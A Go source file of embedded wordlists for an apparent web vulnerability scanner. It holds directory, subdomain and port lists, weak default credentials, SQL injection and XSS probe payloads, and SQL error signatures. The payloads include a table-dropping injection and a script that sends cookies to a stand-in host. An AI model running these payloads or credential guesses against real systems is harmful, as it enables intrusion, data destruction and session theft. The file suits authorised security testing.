// Package wordlists holds the embedded dictionaries used by the
// hacklith modules. Everything ships inside the binary so the tool
// works offline with zero external dependencies.
package wordlists

// Dirs is the default directory/file brute-force dictionary.
var Dirs = []string{
	"admin", "admin/", "admin/index.php", "admin/login", "admin/login.php",
	"administrator", "administrator/", "administrator/index.php",
	"wp-admin", "wp-admin/", "wp-login.php", "wp-content", "wp-includes",
	"wp-json", "wp-config.php", "wp-config.php.bak", "wp-config.php.old",
	"login", "login/", "login.php", "signin", "signin/", "signup",
	"user", "users", "member", "members", "account", "accounts",
	"account/login", "user/login", "member/login", "profile", "my-account",
	"dashboard", "console", "panel", "controlpanel", "cpanel", "webmail",
	"phpmyadmin", "phpmyadmin/", "pma", "pma/", "myadmin", "adminer.php",
	"adminer", "sqladmin", "mysql", "dbadmin", "pgadmin",
	"api", "api/", "v1", "v2", "v3", "graphql", "rest", "swagger",
	"swagger-ui", "swagger-ui/", "swagger.json", "openapi.json", "docs",
	"public", "private", "secure", "internal",
	"upload", "uploads", "uploads/", "images", "img", "assets", "static",
	"css", "js", "media", "files", "download", "downloads", "filemanager",
	"data", "db", "database", "sql", "dump", "dump.sql", "database.sql",
	"backup", "backups", "backup.sql", "backup.zip", "backup.tar.gz",
	"old", "new", "test", "testing", "temp", "tmp", "demo", "beta", "alpha",
	"dev", "development", "stage", "staging", "preprod", "prod", "production",
	"config", "configuration", "settings", "env", ".env", ".env.bak",
	".git", ".git/", ".git/config", ".git/HEAD", ".svn", ".hg", ".DS_Store",
	".htaccess", ".htpasswd", "robots.txt", "sitemap.xml", "sitemap.xml.gz",
	"crossdomain.xml", "server-status", "server-info", "status", "health",
	"healthz", "ping", "metrics", "prometheus", "grafana", "kibana",
	"jenkins", "gitlab", "sonar", "traefik", "docker", "registry",
	"shell", "cmd", "exec", "shell.php", "cmd.php", "phpinfo.php",
	"info.php", "test.php", "install", "install.php", "setup", "setup.php",
	"license", "license.txt", "readme", "readme.html", "readme.txt",
	"changelog", "changelog.txt", "version", "ver", "VERSION",
	"index.php", "index.html", "home", "about", "contact",
	"search", "search.php", "shop", "cart", "checkout", "products",
	"product", "item", "items", "catalog", "category", "order", "orders",
	"invoice", "receipt", "settings.php", "config.php", "config.php.bak",
	"db.php", "database.php", "error", "404", "forbidden", "access",
	"audit", "logs", "log", "logging", "debug", "trace", "monitor",
	"monitoring", "alerts", "notifications", "mail", "email", "messages",
	"chat", "forum", "blog", "news", "export", "import", "report",
	"reports", "help", "faq", "support", "status.php", "server.php",
	"upload.php", "filemanager/", "editor", "phpmyadmin/index.php",
	"admin/phpmyadmin", "admin/dashboard", "user/panel", "admin2",
}

// Subdomains is the default subdomain brute-force dictionary.
var Subdomains = []string{
	"www", "www2", "www3", "mail", "mail2", "smtp", "smtp2", "pop", "imap",
	"ftp", "sftp", "ssh", "vpn", "ns1", "ns2", "ns3", "ns4", "dns", "mx",
	"mx1", "mx2", "relay", "webmail", "webmail2", "admin", "adm", "admin1",
	"admin2", "dashboard", "api", "api2", "api3", "app", "apps", "dev",
	"development", "test", "testing", "stage", "staging", "preprod", "qa",
	"uat", "beta", "alpha", "demo", "sandbox", "prod", "production",
	"secure", "ssl", "shop", "store", "checkout", "pay", "payment",
	"billing", "support", "help", "helpdesk", "ticket", "tickets", "forum",
	"blog", "news", "portal", "intranet", "extranet", "git", "gitlab",
	"github", "jenkins", "ci", "cd", "build", "docker", "k8s",
	"kubernetes", "grafana", "kibana", "prometheus", "metrics",
	"monitoring", "nagios", "zabbix", "cacti", "phpmyadmin", "pma", "db",
	"mysql", "postgres", "mongo", "mongodb", "redis", "cache", "cdn",
	"static", "assets", "media", "images", "uploads", "files", "download",
	"downloads", "remote", "crm", "erp", "hr", "wiki", "docs", "doc",
	"status", "statuspage", "health", "autodiscover", "autoconfig", "m",
	"mobile", "legacy", "old", "new", "web", "webserver", "server", "srv",
	"gate", "gateway", "proxy", "lb", "load", "backup", "backups",
	"storage", "data", "analytics", "logs", "internal", "jira",
	"confluence", "bitbucket", "svn", "vcs", "repo", "repositories",
	"mail3", "mx3", "web2", "portal2", "cpanel", "whm", "ns01", "ns02",
}

// SQLi holds error/boolean/time-based injection payloads.
var SQLi = []string{
	"'",
	`"`,
	"')",
	`' OR '1'='1`,
	`' OR '1'='1' -- -`,
	`' OR '1'='1' #`,
	`" OR "1"="1" -- -`,
	`' OR 1=1-- -`,
	`" OR 1=1-- -`,
	`1' OR '1'='1'#`,
	`1" OR "1"="1"#`,
	`' AND 1=1-- -`,
	`' AND 1=2-- -`,
	`' UNION SELECT NULL-- -`,
	`' UNION SELECT NULL,NULL-- -`,
	`' UNION SELECT NULL,NULL,NULL-- -`,
	`' UNION SELECT NULL,NULL,NULL,NULL-- -`,
	`' OR EXISTS(SELECT * FROM users)-- -`,
	`1; DROP TABLE users-- -`,
	`' OR SLEEP(3)-- -`,
	`'; SELECT SLEEP(3)-- -`,
	`1 AND SLEEP(3)`,
	`' AND SLEEP(3)-- -`,
	`1 OR SLEEP(3)`,
}

// XSS holds reflected-XSS probe payloads. The detector checks whether the
// raw payload string comes back unescaped in the response body.
var XSS = []string{
	`<script>alert(1)</script>`,
	`<script>alert(document.domain)</script>`,
	`<img src=x onerror=alert(1)>`,
	`<svg/onload=alert(1)>`,
	`"><svg/onload=alert(1)>`,
	`'><script>alert(1)</script>`,
	`"><script>alert(1)</script>`,
	`<iframe src=javascript:alert(1)>`,
	`<body onload=alert(1)>`,
	`<input onfocus=alert(1) autofocus>`,
	`"><img src=x onerror=alert(1)>`,
	`'><img src=x onerror=alert(1)>`,
	`<script>fetch('//example.com/x?'+document.cookie)</script>`,
}

// AdminPaths is a focused dictionary of admin/sensitive paths.
var AdminPaths = []string{
	"admin", "admin/", "admin/index.php", "admin/login", "admin/login.php",
	"administrator", "administrator/", "administrator/index.php",
	"wp-admin", "wp-admin/", "wp-login.php", "login", "login/",
	"login.php", "user/login", "member/login", "account/login",
	"cpanel", "webmail", "phpmyadmin", "phpmyadmin/", "adminer.php",
	"pma/", "myadmin/", "dashboard", "controlpanel", "user/panel",
	"admin2", "console", "panel/", "server-status", ".git/config",
	"config.php.bak", "wp-config.php.bak",
}

// Cred is a username/password pair.
type Cred struct{ User, Pass string }

// WeakCreds is the default weak-credential dictionary used by the
// admin login probe.
var WeakCreds = []Cred{
	{"admin", "admin"}, {"admin", "password"}, {"admin", "123456"},
	{"admin", "admin123"}, {"admin", "1234"}, {"admin", "12345"},
	{"admin", "12345678"}, {"admin", "root"}, {"admin", "toor"},
	{"admin", "pass"}, {"admin", "pass123"}, {"admin", "letmein"},
	{"admin", "welcome"}, {"admin", "qwerty"}, {"admin", "admin888"},
	{"admin", "administrator"}, {"admin", "default"}, {"admin", "0000"},
	{"root", "root"}, {"root", "toor"}, {"root", "password"},
	{"root", "123456"}, {"administrator", "administrator"},
	{"test", "test"}, {"test", "123456"}, {"user", "user"},
	{"user", "password"}, {"guest", "guest"},
}

// Methods probed by the HTTP method checker.
var Methods = []string{"OPTIONS", "HEAD", "GET", "POST", "PUT", "DELETE", "PATCH", "TRACE", "PROPFIND"}

// CommonPorts is the default port-scan list.
var CommonPorts = []int{
	21, 22, 23, 25, 53, 69, 80, 81, 110, 111, 135, 139, 143, 443, 445,
	465, 514, 587, 631, 636, 873, 993, 995, 1080, 1433, 1521, 1723,
	2049, 2375, 3000, 3306, 3389, 4369, 5000, 5432, 5601, 5900, 5984,
	6379, 7001, 8000, 8008, 8080, 8081, 8088, 8443, 8888, 9000, 9090,
	9092, 9200, 9300, 10000, 11211, 15672, 27017, 27018, 50070, 61616,
}

// PortServices maps common ports to their typical service name.
var PortServices = map[int]string{
	21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
	69: "tftp", 80: "http", 81: "http-alt", 110: "pop3", 111: "rpcbind",
	135: "msrpc", 139: "netbios-ssn", 143: "imap", 443: "https",
	445: "microsoft-ds", 465: "smtps", 514: "syslog", 587: "smtp-submission",
	631: "ipp", 636: "ldaps", 873: "rsync", 993: "imaps", 995: "pop3s",
	1080: "socks", 1433: "mssql", 1521: "oracle", 1723: "pptp",
	2049: "nfs", 2375: "docker", 3000: "gitea/grafana/spring", 3306: "mysql",
	3389: "rdp", 4369: "epmd", 5000: "http-alt", 5432: "postgresql",
	5601: "kibana", 5900: "vnc", 5984: "couchdb", 6379: "redis",
	7001: "weblogic", 8000: "http-alt", 8008: "http-alt", 8080: "http-proxy",
	8081: "http-alt", 8088: "http-alt", 8443: "https-alt", 8888: "http-alt",
	9000: "php-fpm/sonar", 9090: "prometheus", 9092: "kafka", 9200: "elasticsearch",
	9300: "elasticsearch", 10000: "webmin", 11211: "memcached",
	15672: "rabbitmq", 27017: "mongodb", 27018: "mongodb", 50070: "hadoop-namenode",
	61616: "activemq",
}

// TopPorts is a broader "top 1000-ish" list used with --ports top.
var TopPorts = []int{
	7, 9, 13, 19, 20, 21, 22, 23, 25, 26, 37, 42, 49, 53, 67, 68, 69,
	70, 79, 80, 81, 82, 83, 84, 88, 90, 98, 101, 102, 106, 110, 111,
	113, 118, 119, 123, 135, 137, 138, 139, 143, 161, 162, 177, 179,
	199, 201, 209, 220, 259, 264, 280, 300, 308, 311, 389, 406, 407,
	427, 443, 444, 445, 464, 465, 497, 500, 512, 513, 514, 515, 521,
	524, 540, 548, 554, 563, 587, 591, 593, 631, 636, 639, 646, 660,
	666, 691, 700, 721, 749, 783, 873, 902, 904, 990, 992, 993, 995,
	1000, 1025, 1026, 1027, 1028, 1029, 1030, 1080, 1099, 1100, 1111,
	1119, 1194, 1241, 1311, 1337, 1352, 1414, 1433, 1443, 1455, 1494,
	1521, 1527, 1604, 1720, 1723, 1741, 1755, 1812, 1883, 1900, 1935,
	1988, 2000, 2001, 2003, 2005, 2010, 2022, 2049, 2082, 2083, 2086,
	2087, 2100, 2181, 2202, 2211, 2222, 2300, 2375, 2376, 2404, 2483,
	2484, 2525, 2628, 2809, 3000, 3001, 3050, 3074, 3128, 3260, 3268,
	3269, 3306, 3307, 3389, 3391, 3443, 3541, 3632, 3690, 3784, 3868,
	4000, 4040, 4045, 4190, 4224, 4321, 4443, 4500, 4505, 4506, 4567,
	4711, 4712, 4848, 4899, 5000, 5001, 5003, 5005, 5006, 5007, 5009,
	5038, 5050, 5060, 5061, 5101, 5120, 5222, 5223, 5269, 5280, 5353,
	5357, 5432, 5443, 5555, 5556, 5631, 5632, 5672, 5800, 5801, 5900,
	5901, 5902, 5984, 5985, 5986, 6000, 6001, 6002, 6003, 6004, 6050,
	6080, 6101, 6161, 6379, 6443, 6666, 6667, 6668, 6697, 6881, 6900,
	7001, 7002, 7070, 7077, 7080, 7100, 7200, 7443, 7474, 7547, 7777,
	7778, 8000, 8001, 8002, 8005, 8006, 8008, 8009, 8010, 8020, 8042,
	8060, 8069, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088,
	8089, 8090, 8091, 8095, 8098, 8100, 8111, 8123, 8161, 8180, 8181,
	8200, 8222, 8300, 8333, 8383, 8400, 8443, 8500, 8600, 8800, 8811,
	8834, 8880, 8881, 8888, 8889, 8983, 8999, 9000, 9001, 9002, 9009,
	9010, 9042, 9043, 9050, 9060, 9090, 9091, 9092, 9100, 9101, 9151,
	9191, 9200, 9201, 9300, 9312, 9389, 9443, 9500, 9600, 9700, 9876,
	9898, 9999, 10000, 10001, 10022, 10080, 10081, 10250, 10443, 10566,
	10666, 11000, 11111, 11211, 11443, 12000, 12174, 12265, 12321,
	12345, 12700, 12701, 13000, 13306, 13364, 13579, 14441, 14442,
	15000, 15672, 16080, 16113, 16567, 17000, 17170, 18000, 18017,
	18080, 18081, 18082, 18090, 18245, 19000, 19283, 19315, 20000,
	20001, 21000, 22000, 22222, 23023, 23456, 24000, 24444, 25000,
	25565, 27017, 27018, 27352, 27715, 28017, 30000, 30718, 31000,
	32400, 32768, 33060, 33333, 33890, 35357, 37777, 40000, 41111,
	41516, 42222, 44101, 44818, 45000, 47001, 47808, 49152, 50000,
	50030, 50060, 50070, 50075, 50090, 50100, 51111, 53000, 55554,
	55555, 56789, 60000, 60020, 61616, 62078, 64738, 65535,
}


// SQLiSignatures maps database error-message fragments to the engine
// that produced them. The SQLi module flags a parameter when a payload
// makes the application echo one of these back.
var SQLiSignatures = map[string]string{
	"you have an error in your sql syntax": "MySQL",
	"mysql_fetch":                          "MySQL (old driver)",
	"warning: mysql_":                      "MySQL (legacy)",
	"supplied argument is not a valid mysql": "MySQL (legacy)",
	"sqlsrv_fetch":                         "MSSQL",
	"unclosed quotation mark":              "MSSQL",
	"microsoft ole db":                     "MSSQL (OLEDB)",
	"odbc sql server driver":               "MSSQL (ODBC)",
	"sqlserver jdbc":                       "MSSQL (JDBC)",
	"in syntax error":                      "MSSQL",
	"postgresql query failed":              "PostgreSQL",
	"pg_query()":                           "PostgreSQL (PHP)",
	"postgresql:":                          "PostgreSQL",
	"oracle error":                         "Oracle",
	"ora-":                                 "Oracle",
	"sqlite_error":                         "SQLite",
	"sqlite3":                              "SQLite",
	"sqlite_query":                         "SQLite (PHP)",
	"mongo db":                             "MongoDB",
	"mongoerror":                           "MongoDB",
	"uncaught exception":                   "Generic engine",
	"sql syntax":                           "MySQL",
	"database error":                       "Generic engine",
	"db query failed":                      "Generic engine",
	"query failed":                         "Generic engine",
	"invalid query":                        "Generic engine",
	"unknown column":                       "Generic engine",
	"column not found":                     "Generic engine",
	"division by zero":                     "Generic engine",
	"near \"":                              "SQLite/MySQL",
	"syntax error at or near":              "PostgreSQL",
	"quoted string not properly terminated": "Oracle",
	"mysql server version":                 "MySQL",
	"sqlstate":                             "Generic driver",
}

